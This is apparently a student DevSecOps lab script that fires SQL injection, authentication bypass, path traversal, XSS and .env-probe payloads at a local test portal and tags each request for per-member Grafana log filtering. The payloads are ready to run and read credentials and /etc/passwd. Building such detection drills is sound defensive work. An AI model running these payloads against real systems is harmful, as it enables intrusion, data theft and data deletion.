# -*- coding: utf-8 -*-
"""
KỊCH BẢN DIỄN TẬP KIỂM THỬ AN NINH VÀ PHÁT THẢI TELEMETRY THEO TỪNG THÀNH VIÊN
Dự án: DevSecOps InlaneWeb Logistics Portal, Nhóm 11, lớp M26CQAT01-B

Mục đích
  - Kích hoạt đúng các lỗ hổng mà MỘT thành viên phụ trách, thay vì chạy cả bộ.
  - Chèn mã định danh của thành viên vào mọi yêu cầu gửi đi, để trên Grafana chỉ
    cần lọc một chuỗi là tách được toàn bộ lưu lượng của người đó.
  - Sinh đồng thời hai luồng nhật ký: lưu lượng HTTP của Apache và lỗi ứng dụng.

Cách dùng
    python simulate_telemetry.py --mem namng
    python simulate_telemetry.py --mem haind --base-url http://127.0.0.1:8088
    python simulate_telemetry.py --list
    python simulate_telemetry.py --all

Mã định danh được chèn vào BỐN chỗ của mỗi yêu cầu, nhờ vậy nó xuất hiện ở cả hai
luồng nhật ký và mọi phân vùng Grafana đều lọc được:
    1. User-Agent            -> trường user_agent trong log JSON của Apache
    2. Tham số mem trên URL  -> trường query trong log JSON của Apache
    3. Phần chú thích cuối tải trọng -> trường failed_query trong log lỗi ứng dụng
    4. Tham số mem trong thân yêu cầu POST
"""

from __future__ import annotations

import argparse
import http.cookiejar
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

# =============================================================================
#  DANH SÁCH THÀNH VIÊN VÀ PHẠM VI LỖ HỔNG PHỤ TRÁCH
# =============================================================================
THANH_VIEN = {
    "namng": {
        "ten": "Nguyễn Giang Nam",
        "msv": "B26CHAT030",
        "pham_vi": "Cổng thông tin công cộng, tra cứu cảng biển và tin tức",
        "cases": ["V1", "V14", "V16"],
    },
    "haind": {
        "ten": "Nguyễn Đình Hải",
        "msv": "B26CHAT010",
        "pham_vi": "Xác thực người dùng và theo dõi vận đơn",
        "cases": ["V3", "V2", "V4"],
    },
    "manhdx": {
        "ten": "Đào Xuân Mạnh",
        "msv": "B26CHAT026",
        "pham_vi": "Cẩm nang hàng hải và hệ thống kết xuất báo cáo",
        "cases": ["V15", "V13", "V11"],
    },
    "anhld": {
        "ten": "Lê Đức Anh",
        "msv": "B26CHAT003",
        "pham_vi": "Tài khoản, hồ sơ đối tác và chi tiết vận tải",
        "cases": ["V5", "V6", "V7"],
    },
    "mainp": {
        "ten": "Nguyễn Phương Mai",
        "msv": "B26CHAT025",
        "pham_vi": "Bình luận đơn hàng và phân hệ quản trị",
        "cases": ["V8", "V9", "V10", "V12"],
    },
}

# Tài khoản mẫu của môi trường thực nghiệm, dùng để chạm tới các trang cần đăng nhập
TK_USER = ("jsmith", "Spring2024!")
# Trang quản trị chỉ mở cho vai trò admin. Dùng chính lỗ hổng vượt xác thực của
# phân hệ đăng nhập để lấy phiên, đây cũng là một phần nội dung cần diễn tập.
TK_ADMIN_BYPASS = ("admin'-- -", "x")

# =============================================================================
#  DANH MỤC KỊCH BẢN. Đường dẫn khớp với bộ định tuyến thật trong index.php
#  quyen: None không cần đăng nhập, "user" cần tài khoản thường, "admin" cần quản trị
# =============================================================================
KICH_BAN = [
    {"id": "V1", "ten": "Ghép bảng dữ liệu tại tra cứu cảng", "method": "GET",
     "path": "/ports", "params": {"q": "cn' UNION SELECT 1, @@version, user(), 4-- -"},
     "quyen": None, "panel": "SQL Injection trong lưu lượng HTTP",
     "mo_ta": "Ghép bảng để đọc phiên bản máy chủ và tài khoản kết nối"},

    {"id": "V2", "ten": "Ép lỗi đọc dữ liệu tại chi tiết cảng", "method": "GET",
     "path": "/ports/CN SHA' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
     "params": {}, "quyen": None, "panel": "Rò rỉ lỗi và mã phản hồi 5xx",
     "mo_ta": "Ép hàm xử lý báo lỗi để tên cơ sở dữ liệu lọt ra thông báo"},

    {"id": "V3", "ten": "Vượt xác thực tại trang đăng nhập", "method": "POST",
     "path": "/login", "params": {},
     "data": {"username": "admin'-- -", "password": "khong-can-biet"},
     "quyen": None, "panel": "Bất thường xác thực",
     "mo_ta": "Vô hiệu mệnh đề kiểm tra mật khẩu bằng chuỗi ngắt câu lệnh"},

    {"id": "V4", "ten": "Suy diễn dữ liệu theo độ trễ", "method": "GET",
     "path": "/api/track", "params": {"tracking": "ILF1042CN' AND SLEEP(3)-- -"},
     "quyen": None, "panel": "Độ trễ cao và suy diễn theo thời gian",
     "mo_ta": "Tiêm hàm trễ, quan sát thời gian đáp ứng tăng vọt"},

    {"id": "V5", "ten": "Chèn lệnh vào mệnh đề sắp xếp", "method": "GET",
     "path": "/account", "params": {"order": "(extractvalue(1,concat(0x7e,(SELECT user()))))-- -"},
     "quyen": "user", "panel": "SQL Injection trong lưu lượng HTTP",
     "mo_ta": "Chèn biểu thức vào mệnh đề sắp xếp danh sách vận đơn"},

    {"id": "V6", "ten": "Chèn lệnh ghi tại cập nhật hồ sơ", "method": "POST",
     "path": "/account/update", "params": {},
     "data": {"email": "tester@inlane.vn', role='admin' WHERE username='jsmith'-- -"},
     "quyen": "user", "panel": "Bất thường xác thực",
     "mo_ta": "Mở rộng câu lệnh ghi để tự nâng vai trò tài khoản"},

    {"id": "V7", "ten": "Chèn lệnh trên tham số dạng số", "method": "GET",
     "path": "/shipments/1 AND 1=1-- -", "params": {},
     "quyen": "user", "panel": "SQL Injection trong lưu lượng HTTP",
     "mo_ta": "Tham số định danh không ép kiểu nên nhận cả biểu thức"},

    {"id": "V8", "ten": "Chèn lệnh thêm bản ghi tại bình luận", "method": "POST",
     "path": "/shipments/1/comments", "params": {},
     "data": {"content": "ghi chu' || (SELECT extractvalue(1, concat(0x7e, (SELECT version())))) || '"},
     "quyen": "user", "panel": "Rò rỉ lỗi và mã phản hồi 5xx",
     "mo_ta": "Ép lỗi ngay trong câu lệnh thêm bản ghi để đọc dữ liệu"},

    {"id": "V9", "ten": "Chèn lệnh xóa hàng loạt", "method": "GET",
     "path": "/comments/0 OR 1=1/delete", "params": {},
     "quyen": "user", "panel": "Thao tác xóa dữ liệu bất thường",
     "mo_ta": "Điều kiện luôn đúng làm phạm vi xóa mở rộng ngoài ý định"},

    {"id": "V10", "ten": "Dò quét danh sách tài khoản tại quản trị", "method": "GET",
     "path": "/admin", "params": {"customer": "a' UNION SELECT username, email, role FROM users-- -"},
     "quyen": "admin", "panel": "Truy cập trái phép phân hệ quản trị",
     "mo_ta": "Ghép bảng tại ô tìm khách hàng để lấy toàn bộ tài khoản"},

    {"id": "V11", "ten": "Chèn lệnh tạo bảng tại kết xuất báo cáo", "method": "POST",
     "path": "/admin/reports/export", "params": {},
     "data": {"report_name": "dientap_leak AS SELECT * FROM users-- -"},
     "quyen": "admin", "panel": "Truy cập trái phép phân hệ quản trị",
     "mo_ta": "Chiếm dụng câu lệnh tạo bảng để sao chép bảng tài khoản"},

    {"id": "V12", "ten": "Ghép nhiều câu lệnh tại bảng điều khiển", "method": "GET",
     "path": "/admin/console", "params": {"filter": "status FROM shipments; SELECT 1-- -"},
     "quyen": "admin", "panel": "Cảnh báo ghép nhiều câu lệnh",
     "mo_ta": "Hàm thực thi nhiều câu lệnh cho phép chạy liên tiếp nhiều lệnh"},

    {"id": "V13", "ten": "Đọc tệp tùy ý qua hàm của cơ sở dữ liệu", "method": "GET",
     "path": "/reports/download", "params": {"ref": "x' UNION SELECT LOAD_FILE('/etc/passwd')-- -"},
     "quyen": None, "panel": "Đọc tệp và duyệt thư mục",
     "mo_ta": "Ép hàm đọc tệp của máy chủ cơ sở dữ liệu"},

    {"id": "V14", "ten": "Ghép bảng tại cổng tin tức", "method": "GET",
     "path": "/news", "params": {"id": "0 UNION SELECT 1, username, password FROM users-- -"},
     "quyen": None, "panel": "SQL Injection trong lưu lượng HTTP",
     "mo_ta": "Tham số dạng số tại trang tin tức công khai"},

    {"id": "V15", "ten": "Duyệt ngược thư mục tại trang cẩm nang", "method": "GET",
     "path": "/guide", "params": {"doc": "../../../../etc/passwd"},
     "quyen": None, "panel": "Đọc tệp và duyệt thư mục",
     "mo_ta": "Nạp tệp động không qua danh sách cho phép"},

    {"id": "V16", "ten": "Phản xạ mã kịch bản tại ô tìm kiếm", "method": "GET",
     "path": "/ports", "params": {"q": "<script>alert('DevSecOps')</script>"},
     "quyen": None, "panel": "Chèn mã kịch bản",
     "mo_ta": "Giá trị nhập được in thẳng ra HTML mà không mã hóa"},

    {"id": "V17", "ten": "Dò tìm tệp cấu hình môi trường", "method": "GET",
     "path": "/.env", "params": {}, "quyen": None,
     "panel": "Dò quét và thăm dò hệ thống",
     "mo_ta": "Thăm dò tệp cấu hình chứa biến môi trường"},
]

BANG_CASE = {c["id"]: c for c in KICH_BAN}

# =============================================================================
#  CHÈN MÃ ĐỊNH DANH THÀNH VIÊN VÀO YÊU CẦU
# =============================================================================
def ma_dinh_danh(khoa: str) -> str:
    """MEM_NAMNG, MEM_HAIND ... Chuỗi này là thứ sẽ lọc trên Grafana."""
    return "MEM_" + khoa.upper()


# Bảng điều khiển trên Grafana nhận diện thành viên qua chuỗi member=<khóa>.
# Một khóa trên bảng điều khiển viết khác với khóa nhánh nên cần ánh xạ lại.
KHOA_BANG_DIEU_KHIEN = {"mainp": "maipn"}


def nhan_bang_dieu_khien(khoa: str) -> list:
    """Danh sách nhãn member cần chèn để hai panel thành viên nhận được dữ liệu."""
    ten = [khoa]
    phu = KHOA_BANG_DIEU_KHIEN.get(khoa)
    if phu and phu not in ten:
        ten.append(phu)
    return ten


def gan_the(gia_tri: str, the: str) -> str:
    """Gắn mã định danh vào cuối tải trọng.

    Nếu tải trọng kết thúc bằng chú thích SQL thì viết mã vào ngay sau dấu chú
    thích, nhờ vậy câu lệnh vẫn hợp lệ mà mã định danh đi theo vào trường
    failed_query của luồng nhật ký lỗi ứng dụng.
    """
    if gia_tri.rstrip().endswith("-- -"):
        return gia_tri.rstrip()[:-1] + the
    if "-- " in gia_tri:
        return gia_tri + " " + the
    return gia_tri + " " + the


class BoChay:
    def __init__(self, base_url: str, the: str, khoa: str = "", timeout: int = 20):
        self.base = base_url.rstrip("/")
        self.the = the
        self.khoa = khoa or the.replace("MEM_", "").lower()
        self.nhan = nhan_bang_dieu_khien(self.khoa)
        self.timeout = timeout
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            KhongChuyenHuong(),
        )
        self.phien = None   # None, "user" hoặc "admin"

    def _headers(self, case_id: str) -> dict:
        return {
            # Mã định danh nằm trong User-Agent, Apache ghi trường này vào log JSON
            "User-Agent": (
                f"DevSecOps-Telemetry/3.0 ({self.the}; "
                f"[member: {self.khoa}]; case={case_id})"
            ),
            "Accept": "text/html,application/json,*/*",
            "X-Member": self.the,
            "X-Simulated-By": "PTIT-DevSecOps-Nhom11",
        }

    def goi(self, case: dict) -> tuple[int, float, str]:
        path = gan_the(case["path"], self.the) if "'" in case["path"] else case["path"]
        url = self.base + urllib.parse.quote(path, safe="/?=&%")

        params = dict(case.get("params") or {})
        params = {k: gan_the(v, self.the) for k, v in params.items()}
        # Tham số mem luôn có mặt, kể cả khi kịch bản không có tham số nào khác
        params["mem"] = self.the
        cap = list(params.items()) + [("member", n) for n in self.nhan]
        url += ("&" if "?" in url else "?") + urllib.parse.urlencode(cap)

        body = None
        headers = self._headers(case["id"])
        if case["method"] == "POST":
            data = {k: gan_the(v, self.the) for k, v in (case.get("data") or {}).items()}
            data["mem"] = self.the
            body = urllib.parse.urlencode(
                list(data.items()) + [("member", n) for n in self.nhan]).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"

        req = urllib.request.Request(url, data=body, headers=headers, method=case["method"])
        t0 = time.time()
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                return r.status, time.time() - t0, "OK"
        except urllib.error.HTTPError as e:
            return e.code, time.time() - t0, f"HTTP {e.code}"
        except urllib.error.URLError as e:
            return 0, time.time() - t0, f"Khong ket noi duoc: {e.reason}"
        except Exception as e:                                   # noqa: BLE001
            return 0, time.time() - t0, f"Loi: {e}"

    def dang_nhap(self, quyen: str) -> bool:
        """Lấy phiên làm việc cần thiết để chạm tới trang yêu cầu đăng nhập."""
        if quyen is None or self.phien == quyen:
            return True
        self.jar.clear()
        user, pwd = TK_USER if quyen == "user" else TK_ADMIN_BYPASS
        body = urllib.parse.urlencode({"username": user, "password": pwd, "mem": self.the}).encode()
        req = urllib.request.Request(
            self.base + "/login", data=body, method="POST",
            headers={**self._headers("LOGIN"),
                     "Content-Type": "application/x-www-form-urlencoded"})
        try:
            with self.opener.open(req, timeout=self.timeout):
                pass
        except urllib.error.HTTPError:
            pass
        except Exception:                                        # noqa: BLE001
            return False
        self.phien = quyen
        return True


class KhongChuyenHuong(urllib.request.HTTPRedirectHandler):
    """Giữ nguyên mã 302 để thấy đúng mã phản hồi của từng kịch bản."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


# =============================================================================
#  GIAO DIỆN DÒNG LỆNH
# =============================================================================
def in_danh_sach() -> None:
    print("=" * 86)
    print(" DANH SÁCH THÀNH VIÊN VÀ LỖ HỔNG PHỤ TRÁCH")
    print("=" * 86)
    for khoa, tv in THANH_VIEN.items():
        print(f"\n  --mem {khoa:<8} {tv['ten']}  ({tv['msv']})")
        print(f"  {'':14}{tv['pham_vi']}")
        print(f"  {'':14}Mã định danh chèn vào yêu cầu: {ma_dinh_danh(khoa)}")
        for cid in tv["cases"]:
            c = BANG_CASE[cid]
            print(f"  {'':14}  {cid:<4} {c['ten']}")
    print("\n" + "=" * 86)


def main() -> int:
    p = argparse.ArgumentParser(
        description="Diễn tập kiểm thử an ninh theo từng thành viên và phát thải telemetry",
        epilog="Ví dụ: python simulate_telemetry.py --mem namng")
    p.add_argument("--mem", help="Mã thành viên: namng, haind, manhdx, anhld, mainp")
    p.add_argument("--all", action="store_true", help="Chạy lần lượt toàn bộ năm thành viên")
    p.add_argument("--list", action="store_true", help="Xem danh sách thành viên và lỗ hổng phụ trách")
    p.add_argument("--cases", nargs="*", help="Chạy thẳng một số mã kịch bản, ví dụ V1 V4")
    p.add_argument("--base-url", default="http://127.0.0.1:8088",
                   help="Địa chỉ cổng InlaneWeb mục tiêu, mặc định môi trường thực nghiệm cục bộ")
    p.add_argument("--delay", type=float, default=1.2, help="Giãn cách giữa hai yêu cầu, tính bằng giây")
    p.add_argument("--repeat", type=int, default=1, help="Số vòng lặp để tạo đỉnh trên biểu đồ")
    a = p.parse_args()

    if a.list:
        in_danh_sach()
        return 0
    if not (a.mem or a.all or a.cases):
        p.print_help()
        print("\nThiếu tham số. Hãy nêu rõ thành viên, ví dụ: --mem namng")
        return 2
    if a.mem and a.mem not in THANH_VIEN:
        print(f"Không có thành viên '{a.mem}'. Các mã hợp lệ: {', '.join(THANH_VIEN)}")
        return 2

    if a.all:
        nhom = list(THANH_VIEN)
    elif a.mem:
        nhom = [a.mem]
    else:
        nhom = [None]

    tong_ket = []
    for khoa in nhom:
        if khoa:
            tv = THANH_VIEN[khoa]
            the = ma_dinh_danh(khoa)
            ma_chay = tv["cases"]
            if a.cases:
                # Cho phep chon mot phan kich ban cua chinh thanh vien do,
                # van giu nguyen ma dinh danh de loc tren Grafana.
                loc = [c for c in a.cases if c in tv["cases"]]
                bo = [c for c in a.cases if c not in tv["cases"]]
                if bo:
                    print(f"Bo qua {', '.join(bo)} vi khong thuoc pham vi cua {tv['ten']}")
                if loc:
                    ma_chay = loc
            ds = [BANG_CASE[c] for c in ma_chay]
            tieu_de = f"{tv['ten']}  ({tv['msv']})"
            pham_vi = tv["pham_vi"] if ma_chay == tv["cases"] else ", ".join(ma_chay)
        else:
            the = "MEM_ADHOC"
            ds = [BANG_CASE[c] for c in a.cases if c in BANG_CASE]
            tieu_de = "Chạy theo mã kịch bản chỉ định"
            pham_vi = ", ".join(c["id"] for c in ds)

        print("\n" + "=" * 86)
        print(f" DIỄN TẬP KIỂM THỬ AN NINH  ·  {tieu_de}")
        print("=" * 86)
        print(f" Phạm vi      : {pham_vi}")
        print(f" Mục tiêu     : {a.base_url}")
        print(f" Mã định danh : {the}   (chèn vào User-Agent, tham số mem và tải trọng)")
        print(f" Nhãn bảng    : member={khoa or 'adhoc'}"
              "   (hai panel thành viên trên bảng điều khiển đọc nhãn này)")
        print(f" Số kịch bản  : {len(ds)}   ·   Giãn cách {a.delay}s   ·   Lặp {a.repeat} vòng")
        print("-" * 86)

        bo = BoChay(a.base_url, the, khoa)
        for vong in range(1, a.repeat + 1):
            if a.repeat > 1:
                print(f"\n  --- Vòng {vong}/{a.repeat} ---")
            for i, c in enumerate(ds, 1):
                if c["quyen"] and not bo.dang_nhap(c["quyen"]):
                    print(f"  [{i}/{len(ds)}] {c['id']}  bỏ qua, không lấy được phiên {c['quyen']}")
                    continue
                print(f"  [{i}/{len(ds)}] {c['id']}  {c['ten']}")
                print(f"           {c['method']} {c['path'][:62]}")
                print(f"           {c['mo_ta']}")
                ma, tre, tt = bo.goi(c)
                dau = "cham" if tre >= 2 else "nhanh"
                print(f"        => Mã phản hồi {ma if ma else tt}  ·  {tre:.2f}s ({dau})"
                      f"  ·  Phân vùng: {c['panel']}")
                tong_ket.append((the, c["id"], c["ten"], ma, round(tre, 2), c["panel"]))
                time.sleep(a.delay)

    print("\n" + "=" * 86)
    print(" TỔNG KẾT DIỄN TẬP")
    print("=" * 86)
    print(f" {'Thành viên':<13} {'Mã':<5} {'Kịch bản':<40} {'HTTP':<6} {'Độ trễ':<8}")
    print("-" * 86)
    for the, cid, ten, ma, tre, _ in tong_ket:
        print(f" {the:<13} {cid:<5} {ten[:40]:<40} {str(ma or 'ERR'):<6} {tre:<6}s")

    the_list = sorted({t for t, *_ in tong_ket})
    print("\n" + "-" * 86)
    print(" QUAN SÁT TRÊN GRAFANA")
    print("-" * 86)
    print(" Mở bảng điều khiển, chọn khung thời gian Last 15 minutes rồi lọc theo mã định danh:")
    for t in the_list:
        print(f'   {{container="ilfreight_web"}} |= "{t}"')
    print("\n Tách riêng hai luồng nhật ký của cùng một thành viên:")
    t0 = the_list[0] if the_list else "MEM_NAMNG"
    print(f'   {{container="ilfreight_web"}} |= "{t0}" |= "apache_http_traffic"   luồng lưu lượng HTTP')
    print(f'   {{container="ilfreight_web"}} |= "{t0}" |= "APP-EXCEPTION"         luồng lỗi ứng dụng')
    print("=" * 86)
    return 0


if __name__ == "__main__":
    sys.exit(main())
